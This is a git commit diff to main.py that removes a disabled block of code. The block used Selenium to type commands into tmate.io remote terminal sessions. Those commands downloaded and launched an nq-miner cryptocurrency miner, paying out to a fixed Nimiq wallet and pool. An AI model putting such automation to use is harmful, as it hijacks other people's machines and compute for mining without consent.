2762eb0c92331522c38a58e376201f94a666ef66
ixelizm <57567251+ixelizm@users.noreply.github.com>
2022-03-30 00:26:40 +0300

    Update main.py

--- main.py
+++ main.py
@@ -40,24 +40,7 @@ def send(tmate):
   base = "https://tmate.io/t/"
   url = base + tmate
   print(url)
-"""
-  driver.get(url)
-  time.sleep(3)
-  area = driver.find_element_by_xpath('/html/body/div/div/div/div[2]/div/div/div/div/div[2]/div/textarea')
-  area.send_keys(Keys.ESCAPE)
-  command = ""
-mkdir NimiqMiner
-cd NimiqMiner
-wget https://github.com/tomkha/nq-miner/releases/download/0.99.7/nq-miner-linux-0.99.7.tar.gz -O nq-nimer-linux.zip
-mkdir nq-miner
-tar -xzvf nq-nimer-linux.zip -C nq-miner
-rm nq-nimer-linux.zip
-rm ./nq-miner/start_gpu.sh
-./nq-miner/nq-miner -t cuda -a "NQ718S9KEYU4VCBV4SB5PX73CJJJ3NCV9CM3" -n "ixelizm" -p pool.acemining.co:8443
-""
-  area.send_keys(command)
-  driver.quit()
-  """
+
   return str(url)
     
   
